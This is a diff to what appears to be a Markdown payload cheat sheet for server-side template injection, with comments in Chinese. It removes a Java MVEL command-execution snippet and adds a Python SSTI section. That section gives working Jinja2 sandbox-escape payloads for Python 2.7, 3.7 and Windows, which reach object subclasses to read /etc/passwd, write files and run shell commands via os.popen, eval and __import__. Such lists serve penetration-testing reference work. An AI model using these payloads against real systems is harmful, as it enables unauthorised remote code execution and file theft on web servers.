@@ -42,8 +42,48 @@ String result = parser.parseExpression(expression).getValue().toString();
 </spring:message>
 ```
 
-## Elasticsearch MVEL
-```java
-String expression = "new java.lang.ProcessBuilder(/"calc/").start();";  
-Boolean result = (Boolean) MVEL.eval(expression, vars);
+## Python SSTI
+```python
+#获得基类
+#python2.7
+''.__class__.__mro__[2]
+{}.__class__.__bases__[0]
+().__class__.__bases__[0]
+[].__class__.__bases__[0]
+request.__class__.__mro__[1]
+#python3.7
+''.__class__.__mro__[1]
+{}.__class__.__bases__[0]
+().__class__.__bases__[0]
+[].__class__.__bases__[0]
+request.__class__.__mro__[1]
+
+#python 2.7
+#文件操作
+#找到file类
+[].__class__.__bases__[0].__subclasses__()[40]
+#读文件
+[].__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').read()
+#写文件
+[].__class__.__bases__[0].__subclasses__()[40]('/tmp').write('test')
+
+#命令执行
+#os执行
+[].__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.linecache下有os类，可以直接执行命令：
+[].__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.linecache.os.popen('id').read()
+#eval,impoer等全局函数
+[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__下有eval，__import__等的全局函数，可以利用此来执行命令：
+[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('id').read()")
+[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.eval("__import__('os').popen('id').read()")
+[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.__import__('os').popen('id').read()
+[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()
+
+#python3.7
+#命令执行
+{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('id').read()") }}{% endif %}{% endfor %}
+#文件操作
+{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('filename', 'r').read() }}{% endif %}{% endfor %}
+#windows下的os命令
+"".__class__.__bases__[0].__subclasses__()[118].__init__.__globals__['popen']('dir').read()
 ```
+
